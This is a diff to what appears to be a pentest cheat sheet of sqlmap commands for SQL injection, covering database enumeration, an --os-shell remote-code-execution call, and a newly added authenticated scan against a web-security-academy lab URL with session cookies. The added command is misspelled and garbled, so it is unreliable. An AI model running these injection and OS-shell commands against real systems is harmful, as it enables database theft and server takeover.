@@ -8,7 +8,6 @@
 ```
 sqlmap -u http://172.16.1.12/blog/category.php?id=1 --dbs --batch
 ```
-
 ## Saving Network Package
 
 Enumerating Databases
@@ -33,4 +32,10 @@ RCE
 
 ```
 sqlmap -r sql.req --os-shell --batch
+```
+
+Authenticated
+
+```
+sqmap -u "https://kek.web-security-academy.net/advanced_search?query_search?query-kek+&sort-by-AUTHOR*&logArtist-" --cookie- "_ddwqdsasdsagfgbhtehgterfefwedffewefwfewewf; session=dwqdwqbfhfuzuzuuuu" -dbs --level 5 --risk 3
 ```
